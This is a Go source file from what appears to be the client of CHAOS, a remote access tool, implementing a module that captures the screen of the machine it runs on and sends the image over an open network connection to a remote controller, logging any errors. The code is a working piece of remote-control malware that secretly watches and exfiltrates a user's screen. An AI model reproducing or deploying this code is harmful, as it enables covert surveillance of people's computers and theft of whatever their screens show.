package screenshot

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
)

type ScreenshotUseCase struct {
	Connection net.Conn
}

func NewScreenshotUseCase(conn net.Conn) usecase.Screenshot {
	return &ScreenshotUseCase{
		Connection: conn,
	}
}

func (s ScreenshotUseCase) TakeScreenshot() {
	var errData models.Error
	screenshot, err := util.TakeScreenshot()
	if err != nil {
		log.WithField("cause", err.Error()).Error("error taking screenshot")
		errData.HasError = true
		errData.Message = err.Error()
	}

	if err := network.Send(s.Connection, models.Message{
		Command: "screenshot",
		Data:    screenshot,
		Error:   errData,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending screenshot")
	}
}
